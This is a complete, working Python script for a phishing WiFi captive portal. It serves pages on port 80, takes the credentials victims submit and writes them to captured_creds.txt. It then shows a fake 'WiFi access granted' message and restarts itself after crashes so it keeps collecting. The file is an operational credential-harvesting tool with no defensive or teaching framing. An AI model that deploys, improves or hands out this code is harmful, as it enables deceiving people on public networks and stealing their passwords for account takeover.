#!/usr/bin/env python3
import os
import sys
import time
from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse
from datetime import datetime

ERROR_LOG = "server_errors.log"
COOLDOWN_SECONDS = 120

def log_error(msg):
    print(msg.strip())
    with open(ERROR_LOG, "a") as f:
        f.write(f"{datetime.now()} | {msg.strip()}\n")

class PhishHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post = self.rfile.read(length).decode("utf-8")
        creds = urllib.parse.parse_qs(post)
        try:
            with open("captured_creds.txt", "a") as f:
                f.write(f"{datetime.now()} | {creds}\n")
        except Exception as e:
            log_error(f"[!] Disk write error: {e}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"<html><body><h2>Error: Could not log credentials! Try again later.</h2></body></html>")
            return
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<html><body><h3>WiFi access granted!</h3><p>You are now connected.</p></body></html>")

    def log_message(self, *args): pass  # Quiet

def check_root():
    if os.geteuid() != 0:
        msg = "[!] ERROR: You must run this server as root (sudo) to use port 80."
        log_error(msg)
        sys.exit(1)

def check_python3():
    if sys.version_info[0] < 3:
        msg = "[!] ERROR: This server requires Python 3."
        log_error(msg)
        sys.exit(1)

def run_server():
    try:
        HTTPServer(('', 80), PhishHandler).serve_forever()
    except OSError as e:
        if "Address already in use" in str(e):
            log_error("[!] ERROR: Port 80 is already in use. Kill other web servers/processes on port 80.")
        elif "Permission denied" in str(e):
            log_error("[!] ERROR: Root privileges needed for port 80. Please use sudo.")
        else:
            log_error(f"[!] Unhandled OSError: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[+] Server stopped by user.")
        sys.exit(0)
    except Exception as e:
        log_error(f"[!] Unhandled exception: {e}")
        raise

def main():
    check_python3()
    check_root()
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    print("[*] Starting phishing portal server on port 80.")
    while True:
        try:
            run_server()
        except Exception as crash:
            log_error(f"Server crashed: {crash}. Cooling down for {COOLDOWN_SECONDS} seconds...")
            print(f"[!] Server crashed! See {ERROR_LOG}. Retrying in {COOLDOWN_SECONDS//60} min...")
            time.sleep(COOLDOWN_SECONDS)
        else:
            break

if __name__ == '__main__':
    main()
